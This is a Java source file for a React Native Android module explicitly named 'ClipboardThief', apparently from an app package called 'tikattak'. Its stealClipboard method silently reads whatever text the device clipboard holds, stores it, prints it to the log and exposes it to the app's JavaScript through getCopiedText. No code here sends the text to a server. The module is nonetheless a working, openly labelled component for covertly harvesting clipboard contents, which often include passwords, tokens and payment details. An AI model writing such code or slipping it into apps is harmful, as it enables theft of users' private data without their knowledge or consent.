// ClipboardThiefModule.java

package com.tikattak;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.widget.Toast;

import com.facebook.react.bridge.NativeModule;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContext;
import com.facebook.react.bridge.Callback;
import com.facebook.react.bridge.ReactContextBaseJavaModule;
import com.facebook.react.bridge.ReactMethod;
import com.facebook.react.uimanager.IllegalViewOperationException;
import com.facebook.react.uimanager.PixelUtil;

import java.util.Map;
import java.util.HashMap;

import static android.content.Context.CLIPBOARD_SERVICE;

public class ClipboardThiefModule extends ReactContextBaseJavaModule {
    private static ReactApplicationContext reactContext;

    private static final String DURATION_SHORT_KEY = "SHORT";
    private static final String DURATION_LONG_KEY = "LONG";
    private static final String COPIED_TEXT_KEY = "COPIED";

    public String COPIED_TEXT = "_TEXT_";

    ClipboardThiefModule(ReactApplicationContext context) {
        super(context);
        reactContext = context;
    }

    @Override
    public String getName() {
        return "ClipboardThief";
    }

    @Override
    public Map<String, Object> getConstants() {
        final Map<String, Object> constants = new HashMap<>();
        constants.put(DURATION_SHORT_KEY, Toast.LENGTH_SHORT);
        constants.put(DURATION_LONG_KEY, Toast.LENGTH_LONG);
        constants.put(COPIED_TEXT_KEY, this.COPIED_TEXT);
        return constants;
    }

    @ReactMethod
    public void getCopiedText(Callback successCallback, Callback errorCallback) {
        try{
            successCallback.invoke(this.COPIED_TEXT);
        } catch (Exception e) {
            errorCallback.invoke(e.getMessage());
        }
    }

    @ReactMethod
    public void show(String message, int duration) {
        Toast.makeText(getReactApplicationContext(), message, duration).show();
    }

    @ReactMethod
    public void stealClipboard(int duration) {
        ClipboardManager myClipboard;
        myClipboard = (ClipboardManager)reactContext.getSystemService(CLIPBOARD_SERVICE);
        ClipData clipData = myClipboard.getPrimaryClip();
        ClipData.Item item = clipData.getItemAt(0);
//        Toast.makeText(getReactApplicationContext(), item.getText().toString(), duration).show();
        String text = item.getText().toString();
        this.COPIED_TEXT = text;
        System.out.println("Copied: "+text);
    }
}